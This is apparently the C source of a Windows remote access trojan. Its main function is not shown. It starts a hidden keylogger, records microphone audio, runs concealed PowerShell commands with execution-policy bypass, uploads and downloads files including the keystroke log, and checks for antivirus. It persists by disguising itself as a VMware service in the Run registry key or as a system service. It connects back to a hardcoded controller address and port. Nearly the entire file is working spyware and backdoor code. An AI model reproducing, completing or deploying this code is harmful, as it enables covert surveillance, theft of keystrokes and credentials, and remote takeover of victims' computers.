#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <winsock2.h>
#include <windows.h>
#include <wchar.h>
#include <locale.h>
#include <pthread.h>
#include <shlwapi.h>
#include <Mmsystem.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "../base64.c"
#include "../windows/sysInfoWin.c"
#include "../windows/AvDetector.c"


#define ALIAS "random_str"

// Definiciones
#define SOCKBUFF 2048
#define CMDBUFF 2048

/*

  Creado por "an0mal1a"

       https://github.com/an0mal1a

*/

// Prototipos
long gtflesze(char* filename);
char* rplceFle(char* command, char* toReplace);
char* srtRrcd(SOCKET conn); 
char *sPrvlg();
void cnctn();
void ash(int conn);
void *srtKyRd();
void KyRcrdr(FILE *file);
void _chdir(int conn, char *instruct);
void sendVoiceData(char *filename, SOCKET conn);
void rcrdSv(char *filename);
int mainLoop(int conn);
int excndSnd(int conn, char *cmd);
int getPrstnc(int conn, char *mthd);
int rdFle(int conn, char *instruct);
int upldFnc(char *command, SOCKET conn);
int writeChar(FILE *file, char character, unsigned char i);

// Variables Globales
char *tempDir;
char *file = "sv0.1d.t";    
char direction[500];



char *sPrvlg() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    if (fRet == 0)
        return "no";
    
    else if (fRet == 1)
        return "yes";
    
}

int writeChar(FILE *file, char character, unsigned char i){
    fprintf(file, "%c", character);
    fflush(file);
}

void KyRcrdr(FILE *pcap) {
    unsigned char i;
    while (1) {
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {    
 
                if (pcap == NULL) {
                    printf("Error al abrir el archivo.\n");
                    return;
                }
 
                char convertedKey = i;
 
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                    switch (i) {
                        case VK_SHIFT: convertedKey = '\0'; continue;
                        case VK_ESCAPE: convertedKey = '\0'; continue;
                        case VK_SPACE: convertedKey = ' '; break;
                        case VK_BACK: convertedKey = '\0'; break;
                        case VK_CONTROL: convertedKey = '\0'; continue;
                        case VK_RETURN: convertedKey = '\n'; continue;
                        case VK_OEM_PLUS: writeChar(pcap, '*', i); break;
                        case VK_OEM_MINUS: writeChar(pcap, '_', i); break;
                        case VK_OEM_1: writeChar(pcap, '^', i); break;
                        case VK_OEM_PERIOD: writeChar(pcap, ':', i); break;
                        case VK_OEM_COMMA: writeChar(pcap, ';', i); break;
                        case '1': writeChar(pcap, '!', i); break;
                        case '2': writeChar(pcap, '"', i); break;
                        case '3': fprintf(pcap, "%s", "·"); break;
                        case '4': writeChar(pcap, '$', i); break;
                        case '5': writeChar(pcap, '%', i); break;
                        case '6': writeChar(pcap, '&', i); break;
                        case '7': writeChar(pcap, '/', i); break;
                        case '8': writeChar(pcap, '(', i); break;
                        case '9': writeChar(pcap, ')', i); break;
                        case '0': writeChar(pcap, '=', i); break;
                        case 219: writeChar(pcap, '?', i); break;
                        case 221: fprintf(pcap, "%s", "¿"); break;
                        case 222: fprintf(pcap, "%s", "´"); break;
                        case 220: fprintf(pcap, "%s", "ª"); break;  
                        default: 
                            if (i >= 'A' && i <= 'Z' || i == ' ' ) {
                                writeChar(pcap, i, i);
                            } else { 
                                convertedKey = '\0';
                            }
                            break;
                    }
                } else if (GetKeyState(VK_CAPITAL) & 0x0001) {
                    
                    writeChar(pcap, toupper(i), i); 
                } else {
                    
                    switch (i) {
                        case VK_OEM_PERIOD: writeChar(pcap, '.', i); break;
                        case VK_OEM_MINUS: writeChar(pcap, '-', i); break;
                        case VK_OEM_PLUS: writeChar(pcap, '+', i); break;
                        case VK_OEM_COMMA: writeChar(pcap, ',', i); break;
                        case 222: fprintf(pcap, "%s", "´"); break; // ´
                        case 186: writeChar(pcap, '\x60', i); break; // `
                        case 220: fprintf(pcap, "%s", "º"); break; // º
                        default:  
                            if (i >= 'A' && i <= 'Z' || i == ' ' || i >= '0' && i <= '9') {
                                writeChar(pcap, tolower(i), i);
                            } else { 
                                convertedKey = '\0';
                            }
                    }                    
                }
            }
        }
    }
}

void *srtKyRd() {
    tempDir = getenv("temp");
    snprintf(direction, 200, "%s\\%s", tempDir, file);

    FILE *pcap = fopen(direction, "wb");

    if (pcap == NULL) {
        printf("Error al abrir el archivo.\n");
        return NULL;
    }

    KyRcrdr(pcap);
}


void rcrdSv(char *filename) {
    char mci_pcv[SOCKBUFF];
    char RtrnStg[SOCKBUFF];
    int mciErr;

    sprintf(mci_pcv, "open new type waveaudio alias %s", ALIAS);
    mciErr = mciSendString(mci_pcv, RtrnStg, sizeof(RtrnStg), NULL);
    if (mciErr != 0) {
        printf("\n0");
    }  
    
    sprintf(mci_pcv, "set %s time format ms", ALIAS);   
    mciErr = mciSendString(mci_pcv, RtrnStg, sizeof(RtrnStg), NULL);

    sprintf(mci_pcv, "record %s notify", ALIAS);
    mciErr = mciSendString(mci_pcv, RtrnStg, sizeof(RtrnStg), NULL);
    
    Sleep(11000);

    sprintf(mci_pcv, "stop %s", ALIAS);
    mciErr = mciSendString(mci_pcv, RtrnStg, sizeof(RtrnStg), NULL);

    sprintf(mci_pcv, "save %s %s", ALIAS, filename);
    mciErr = mciSendString(mci_pcv, RtrnStg, sizeof(RtrnStg), NULL);

    sprintf(mci_pcv, "close %s", ALIAS);
    mciErr = mciSendString(mci_pcv, RtrnStg, sizeof(RtrnStg), NULL);


}

long gtflesze(char *filename) {
    struct _stat file_status;
    if (_stat(filename, &file_status) < 0) {
        return -1;
    }
    return file_status.st_size;
}

void rdViceDt(char* file, SOCKET conn) { 

    FILE* ptr = fopen(file, "rb");
    
    char buffer[SOCKBUFF];
    memset(buffer, 0, SOCKBUFF);

    size_t bytesRead = 0;
    long file_size = gtflesze(file);
    char file_size_str[100];
    sprintf(file_size_str, "%ld", file_size);

    //snd full size
    send(conn, file_size_str, 100, 0);

    while ((bytesRead = fread(buffer, 1, SOCKBUFF, ptr)) > 0) {
        send(conn, buffer, SOCKBUFF, 0);
    }
 
    fclose(ptr);
    Sleep(300);
    send(conn, "end\0", strlen("end\0"), 0);
}

char *srtRrcd(SOCKET conn) {
    char* tpdr = getenv("temp");
    char* flnm = "se2h.wv";
    char* fllPth = malloc(strlen(tpdr) + strlen(flnm) + 1);

    strcpy(fllPth, tpdr); strcat(fllPth, "\\"); strcat(fllPth, flnm);

    rcrdSv(fllPth);

    return fllPth;
}


int excndSnd(int conn, char *prc){
    if (strstr(prc, "exec") != NULL) {
        char tRplc[] = "exec ";
        char *substr = strstr(prc, tRplc);
        size_t remainingLength = strlen(substr + strlen(tRplc));
        memmove(prc, substr + strlen(tRplc), remainingLength + 1);

        if (strstr(prc, "cd") != NULL) {
            _chdir(conn, prc); // Asumiendo que tienes una función _chdir personalizada
            return 0;
        }
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    HANDLE hPipeRead, hPipeWrite;

    // Crear un pipe para la salida estándar
    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
        send(conn, "end\0", strlen("end\0"), 0);
        return 1;
    }

    // Configurar STARTUPINFO
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE; // No mostrar la ventana
    si.hStdOutput = hPipeWrite;
    si.hStdError = hPipeWrite;

    char scpdPrc[CMDBUFF];
    int j = 0;
    for (int i = 0; i < strlen(prc) && j < CMDBUFF - 1; ++i, ++j) {
        if (prc[i] == '\"')
            scpdPrc[j++] = '\\'; 
        scpdPrc[j] = prc[i];
    }
    scpdPrc[j] = '\0';

    //char prcLine[CMDBUFF] = "cmd.exe /C ";
    //strncat(prcLine, prc, CMDBUFF - strlen(prcLine) - 1);

    char prcLine[CMDBUFF] = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"";
    strncat(prcLine, scpdPrc, CMDBUFF - strlen(prcLine) - 1);
    strncat(prcLine, "\"", CMDBUFF - strlen(prcLine) - 1);

    if (!CreateProcess(NULL, prcLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        send(conn, "end\0", strlen("end\0"), 0);
        CloseHandle(hPipeWrite);
        CloseHandle(hPipeRead);
        return 1;
    }

    CloseHandle(hPipeWrite);

    char buffer[1024];
    DWORD bytesRead;
    DWORD exitCode;
    while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0'; 
        send(conn, buffer, bytesRead, 0); 
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);

    CloseHandle(hPipeRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    send(conn, "end\0", strlen("end\0"), 0);

    return 0; 

    /*if (strstr(prc, "exec") != NULL){ 
        char tRplc[] = "exec ";

        char *substr = strstr(prc, tRplc);
        size_t remainingLength = strlen(substr + strlen(tRplc));
        memmove(prc, substr + strlen(tRplc), remainingLength + 1);

        if (strstr(prc, "cd") != NULL){
            _chdir(conn, prc);
            return 0;
        } 
    }
    
    FILE *xx = NULL;
    char pth[1024];

    char flprc[CMDBUFF] = "";
    snprintf(flprc, sizeof(flprc), "%s 2>&1", prc); 

    xx = _popen(flprc, "r");
    if (xx == NULL){
        char error[100] = "Error executing command...";
        send(conn, error, sizeof(error), 0);
        return 1;
    }

    while (fgets(pth, sizeof(pth), xx) != NULL){
        send(conn, pth, strlen(pth), 0);
    }

    Sleep(300);
    send(conn, "end\0", strlen("end\0"), 0);
    _pclose(xx);
    return 0;
    */
}


void _chdir(int conn, char *instruct){
    char *drtry = malloc(SOCKBUFF + 1);
    char *nwDr = malloc(SOCKBUFF + 1);
    memset(drtry, 0, strlen(drtry));
    memset(nwDr, 0, strlen(nwDr));

    if (strcmp(instruct, "cd") == 0){
        GetCurrentDirectory(SOCKBUFF + 1, drtry);
        send(conn, drtry, strlen(drtry), 0);
        Sleep(300);
        send(conn, "end\0", strlen("end\0"), 0);
        return;
    }

    char tRplc[] = "cd ";

    char *substr = strstr(instruct, tRplc);
    size_t remainingLength = strlen(substr + strlen(tRplc));
    memmove(drtry, substr + strlen(tRplc), remainingLength + 1);

    SetCurrentDirectory(drtry);
    GetCurrentDirectory(SOCKBUFF + 1, nwDr);
    send(conn, nwDr, strlen(nwDr), 0);

    Sleep(300);
    send(conn, "end\0", strlen("end\0"), 0);
    
    free(drtry);
    free(nwDr);

}

void ash(int conn)
{
    char proc[CMDBUFF] = "";

    while (true)
    {
        recv(conn, proc, sizeof(proc), 0); 
        if (strcmp(proc, "q") == 0){
            memset(proc, 0, SOCKBUFF);
            break;
        } else if (strlen(proc) == 0)
        {
            continue;
        } else if(strstr(proc, "cd") != NULL){
            _chdir(conn, proc);
            memset(proc, 0, SOCKBUFF);
        } else {
            excndSnd(conn, proc);
            memset(proc, 0, SOCKBUFF);
        }
    }
    Sleep(500); 
    return;
}

int rdFle(int conn, char *instruct){
    char *flnme = rplceFle(instruct, "download ");
    if (strcmp(flnme, "keylog") == 0){
        flnme = direction;
    }

    long fullBytes = gtflesze(flnme);

    char fullBytesStr[100];
    snprintf(fullBytesStr, 100, "%ld", fullBytes);
    send(conn, fullBytesStr, strlen(fullBytesStr), 0);
    Sleep(300);

    if (fullBytes == -1){
        send(conn, "-1", 2, 0);
        return 1;
    }

    FILE *cped;
    cped = fopen(flnme, "rb");

    char rdt[SOCKBUFF];
    long btsRd = 0;

    while (true){
        if ((btsRd = fread(rdt, 1, SOCKBUFF - 1, cped)) <= 0)
            break;

        rdt[btsRd] = '\0';
        send(conn, (char *)rdt, btsRd, 0);
        memset(rdt, 0, SOCKBUFF);
    }

    fclose(cped);
    Sleep(400); 
    return 0;

}

char* rplceFle(char* command, char* toReplace) {
    char* file = malloc(strlen(command) + 1); // Asigna memoria a 'file'

    char* substr = strstr(command, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    file[remainingLength] = '\0';

    return file;
}

int upldFnc(char* command, SOCKET conn) { 
    char* bsnm = PathFindFileName(rplceFle(command, "upload "));

    FILE* pcap;
    pcap = fopen(bsnm, "wb");

    unsigned char rvDt[SOCKBUFF];
    size_t btsRd;

    while (true) {
        btsRd = recv(conn, (char *)rvDt, SOCKBUFF, 0);
        
        if (strcmp((char *)rvDt, "end\0") == 0)
            break;

        fwrite(rvDt, 1, btsRd, pcap); 
        memset(rvDt, 0, SOCKBUFF);
        
    }

    fclose(pcap);

}

int getPrstnc(int conn, char *mthd){
    char* ppdt = getenv("APPDATA");
    char* vmsvc = "\\VMwareService.exe";
    char* lctn = malloc(strlen(ppdt) + strlen(vmsvc) + 1);
    strcpy(lctn, ppdt);
    strcat(lctn, vmsvc);

    if (lctn == NULL){
        send(conn, "error", SOCKBUFF, 0);
        return 1;

    } else {
        char pth[255];
        GetModuleFileName(NULL, pth, 255);
        BOOL rst = CopyFile(pth, lctn, FALSE);

        if (!rst) {
            send(conn, "error", SOCKBUFF, 0);
            return 1;

        } else {
            char* frd = malloc(2048 * sizeof(char));
            if (strcmp(mthd, "low") == 0)
                snprintf(frd, SOCKBUFF, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MService /t REG_SZ /d %s /f", lctn);
            
            else if(strcmp(mthd, "high") == 0){

                if (strstr("yes", sPrvlg()) != NULL)
                    snprintf(frd, SOCKBUFF, "sc create \"VMware Service\" binpath= \"%s service\" start= auto", lctn);
                
                else {
                    send(conn, "permissonError", strlen("permissonError"), 0);
                    return 1;
                }
            }

            WinExec(frd, SW_HIDE);
            send(conn, "exito", strlen("exito"), 0);
            return 0;    
        }
    
    }
}


int mainLoop(int conn){
    char instruct[SOCKBUFF];
    while (true){
        memset(instruct, 0, SOCKBUFF);
        recv(conn, instruct, sizeof(instruct), 0); 

        if (strcmp(instruct, "exit") == 0)
            return 0;

        else if (strcmp(instruct, "exit -y") == 0) {
            remove(direction);
            exit(0);
        }
        else if (strcmp(instruct, "shell") == 0)
            ash(conn);

        else if (strstr(instruct, "download ") != NULL){
            rdFle(conn, instruct);
        }
        else if (strstr(instruct, "exec") != NULL)
            excndSnd(conn, instruct);

        else if (strstr(instruct, "upload") != NULL)
            upldFnc(instruct, conn);

        else if (strcmp(instruct, "sysinfo") == 0){
            strtAll(conn); 
        } 
        
        else if (strcmp(instruct, "lowpersistence") == 0) {
            getPrstnc(conn, "low");
            Sleep(300);

        }
        else if (strcmp(instruct, "persistence") == 0) {
            getPrstnc(conn, "high");
            Sleep(300);

        }
        else if (strcmp(instruct, "check") == 0)
            send(conn, sPrvlg(), strlen(sPrvlg()), 0);

        else if (strcmp(instruct, "record") == 0){
            char *file = srtRrcd(conn); 
            rdViceDt(file, conn);

        } else if (strcmp(instruct, "checkAv") == 0){
            lowSearch(conn);
        }
        else
            continue;
    }
    return 0;
}

void cnctn()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
        exit(1);
    }

    // Geberabanis el socket
    int conn = socket(AF_INET, SOCK_STREAM, 0);

    // Generamos estructura de datos
    struct sockaddr_in cltAddr;

    cltAddr.sin_family = AF_INET;
    cltAddr.sin_port = htons(9000); // Especifcamos puerto
    cltAddr.sin_addr.s_addr = inet_addr("192.168.131.33"); // Especifcamos IP

    int targetConnStatus = connect(conn, (struct sockaddr *)&cltAddr,
                                   sizeof(cltAddr));

    if (targetConnStatus == -1){
        Sleep(10000);
        cnctn();
        // printf("%s[!>] %sERROR...\n", YELLOW, RED);
    }
    else{
        pthread_t thread_id;
        pthread_create(&thread_id, NULL, srtKyRd, NULL);

        mainLoop(conn);
        Sleep(10000);
        cnctn();
    }
}
